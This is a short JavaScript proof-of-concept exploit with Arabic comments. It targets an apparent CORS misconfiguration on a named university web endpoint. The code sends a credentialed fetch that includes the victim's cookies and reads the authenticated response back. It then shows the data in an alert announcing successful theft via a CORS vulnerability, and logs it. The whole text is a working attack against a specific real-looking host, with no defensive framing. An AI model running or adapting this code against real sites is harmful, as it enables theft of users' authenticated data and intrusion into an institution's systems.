fetch('https://iisv2.ucsiuniversity.edu.my/cdn-cgi/rum', {
    method: 'GET',
    credentials: 'include' // هذا السطر هو الأهم، لأنه يرسل الكوكيز حقك
})
.then(response => response.text())
.then(data => {
    alert('تم سحب بياناتك بنجاح عبر ثغرة CORS:\n' + data);
    console.log(data);
})
.catch(err => console.error('فشل الاستغلال:', err));
